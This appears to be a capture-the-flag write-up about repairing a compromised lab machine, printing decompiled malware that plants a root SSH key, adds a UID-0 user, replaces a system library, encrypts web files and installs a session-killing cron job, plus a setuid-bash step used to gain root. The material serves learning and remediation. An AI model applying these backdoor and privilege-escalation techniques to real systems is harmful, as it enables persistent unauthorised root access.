Difficulty: Medium

To get the first flag, you need to remove .bashrc from the home directory so you dont get spammed upon logon.

``` bash
ssh alex@10.82.135.124 "rm /home/alex/.bashrc"
```

This gives us Flag 0.

We can then see that we get logged out after some time passes, lets scp the fixutil binary from /home/alex/ out first before we fix that.

Upon analyzing the binary we get this main:
``` C
undefined8 main(void)
{
  FILE *__s;
  
  __s = fopen("/home/alex/.bashrc","a");
  fwrite("\n\nwhile :; do echo \"YOU DIDN\'T SAY THE MAGIC WORD!\"; done &\n",1,0x3c,__s);
  fclose(__s);
  system("/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so");
  __s = fopen("/lib/x86_64-linux-gnu/liblogging.so","wb");
  fwrite(&bin2c_liblogging_so,0x5a88,1,__s);
  fclose(__s);
  system("echo pwned | /bin/admin > /dev/null");
  return 0;
}
```

In the last line you can see a non-standard binary /bin/admin get called. Lets analyze this binary as well.

We get this main, it seems to be from Recoverysoft the company he works at:
``` C
undefined8 main(void)
{
  int iVar1;
  size_t local_20;
  char *local_18;
  char *local_10;
  
  setresuid(0,0,0);
  setresgid(0,0,0);
  puts("Welcome to the Recoverysoft Administration Tool! Please input your password:");
  local_10 = "youdontneedtofindthepassword\n";
  local_18 = (char *)0x0;
  local_20 = 0x100;
  getline(&local_18,&local_20,stdin);
  iVar1 = strcmp(local_18,local_10);
  if (iVar1 == 0) {
    puts("This section is currently under development, sorry.");
  }
  else {
    puts("Incorrect password! This will be logged!");
    LogIncorrectAttempt(local_18);
  }
  return 0;
}
```

In this snippet it attempts privilege escalation, otherwise it only checks a hard-coded password and does nothing other than log incorrect attempts:
``` C
  setresuid(0,0,0);
  setresgid(0,0,0);
```

Back to the original fixutil, this snippet has not been looked at:
```C
  system("/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so");
  __s = fopen("/lib/x86_64-linux-gnu/liblogging.so","wb");
  fwrite(&bin2c_liblogging_so,0x5a88,1,__s);
  fclose(__s);
```

It copies `/lib/x86_64-linux-gnu/liblogging.so` to `/tmp/logging.so`, then opens `/lib/x86_64-linux-gnu/liblogging.so` for writing.
It then writes `&bin2c_liblogging_so` to it.

Analyzing LogIncorrectAttempt gives:

```C
void LogIncorrectAttempt(char *attempt)

{
  time_t tVar1;
  FILE *pFVar2;
  char *attempt_local;
  char *ssh_key;
  FILE *authorized_keys;
  FILE *script_f;
  FILE *cron_f;
  
  system("/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so");
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  pFVar2 = fopen("/root/.ssh/authorized_keys","w");
  fprintf(pFVar2,"%s\n",
          "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMP bY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbw GlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd 0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw5 4x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUyb WsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmK V72rFO6ISrus= root@recovery"
         );
  fclose(pFVar2);
  system("/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null");
  system(
        "/bin/echo \'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3V rUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/\' | /usr/sbin/chpasswd -e"
        );
  XOREncryptWebFiles();
  pFVar2 = fopen("/opt/brilliant_script.sh","w");
  fwrite("#!/bin/sh\n\nfor i in $(ps aux | grep bash | grep -v grep | awk \'{print $2}\'); do kill $ i; done;\n"
         ,1,0x5f,pFVar2);
  fclose(pFVar2);
  pFVar2 = fopen("/etc/cron.d/evil","w");
  fwrite("\n* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog\n\n",1,0x3d,pFVar2);
  fclose(pFVar2);
  chmod("/opt/brilliant_script.sh",0x1ff);
  chmod("/etc/cron.d/evil",0x1ed);
  return;
}
```

/opt/brilliant_script.sh:
``` bash
!/bin/sh

for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
```
This tries to kill bash instances, that's why we were getting kicked from ssh.

/etc/cron.d/evil:
``` cron
* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
```
This runs it every second and writes the log to /tmp/testlog

We can modify brilliant_script.sh, so lets give us a root shell.

```Shell
echo '#!/bin/sh' > /opt/brilliant_script.sh
echo 'cp /bin/bash /tmp/rootbash' >> /opt/brilliant_script.sh
echo 'chmod +s /tmp/rootbash' >> /opt/brilliant_script.sh
chmod +x /opt/brilliant_script.sh
```

This gives us Flag 1.

Renaming `/lib/x86_64-linux-gnu/oldliblogging.so` to `/lib/x86_64-linux-gnu/liblogging.so` gives us Flag 2.

Removing /root/.ssh/authorized_keys gives us Flag 3.

Removing user "security" gives us Flag 4.

We can then use key in `/opt/.fixutil/backup.txt` to decrypt the HTML files and the text file using https://github.com/AlexFSmirnov/xor-decrypt/blob/master/xor-decrypt.py. After moving them back in we get Flag 5.